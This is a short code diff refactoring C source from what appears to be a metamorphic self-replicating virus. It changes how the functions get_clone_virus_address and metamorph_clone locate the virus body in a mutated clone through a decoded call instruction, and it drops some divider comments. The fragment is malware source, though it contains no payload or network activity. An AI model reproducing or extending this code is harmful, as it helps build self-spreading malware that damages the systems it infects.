@@ -15,8 +15,6 @@
 **   syscall calling conventions.
 */
 
-/* ---------------------------------- init ---------------------------------- */
-
 static bool	init_loader_safe(struct safe_ptr *loader_ref,
 			struct safe_ptr clone_ref,
 			size_t loader_off, size_t loader_size)
@@ -70,16 +68,12 @@ static bool	get_clone_virus_address(void **clone_virus_address,
 			struct safe_ptr clone_ref,
 			size_t loader_off, size_t dist_vircall_loader)
 {
-	size_t	vircall_off = loader_off + dist_vircall_loader;
-	void	*clone_vircall = safe(clone_ref, vircall_off, CALL32_INST_SIZE);
+	size_t		vircall_off = loader_off + dist_vircall_loader;
 
-	if (clone_vircall == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRCALL);
+	*clone_virus_address = get_jump32_destination(clone_ref, vircall_off);
 
-	int32_t	*clone_vircall_arg = clone_vircall + 1;
-	void	*clone_vircall_end = clone_vircall + CALL32_INST_SIZE;
-
-	*clone_virus_address = (void*)((ssize_t)clone_vircall_end + *clone_vircall_arg);
+	if (*clone_virus_address == NULL)
+		return errors(ERR_THROW, _ERR_T_GET_CLONE_VIRUS_ADDRESS);
 
 	return true;
 }
@@ -128,8 +122,6 @@ static bool	set_full_virus_size(size_t *full_virus_size,
 	*full_virus_size += virus_buffer_size - virus_size;
 	return true;
 }
-
-/* ---------------------------- metamorph_clone ----------------------------- */
 
 bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off,
 			uint64_t seed, size_t *full_virus_size,
